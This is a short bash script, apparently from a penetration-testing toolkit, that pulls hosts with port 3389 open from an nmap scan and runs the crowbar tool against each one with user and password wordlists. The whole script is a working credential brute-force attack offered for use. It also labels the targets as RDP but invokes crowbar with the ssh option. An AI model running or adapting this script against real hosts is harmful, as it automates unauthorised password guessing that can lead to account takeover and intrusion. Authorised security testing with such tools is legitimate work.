#!/usr/bin/env bash
# Jan-Karel Visser
# LGPLv3 licensed
# https://jan-karel.nl
# https://hacksec.nl

source meuk/globalmeuk.sh

echo "[.] Incompentent bastard "

scanfile=${1:-}

if [ -z "$scanfile" ]; then
  echo "[!] Please provide the name of the nmap file"
  echo "[!] You failed..."
  exit;
fi

result=$(sh -c "./search.sh ${scanfile} 3389")


echo "[.] Incompentent bastard "
echo "[.] Trying ${#result[@]} hosts..."
for xhost in $result; do
  echo "[+] RDP on ${xhost}"
  crowbar -b ssh -s ${xhost}/32 -U meuk/wordlists/users.txt -C meuk/wordlists/passwords.txt -l meuk/logs/crowbar_rdp_${DATUM}.log

done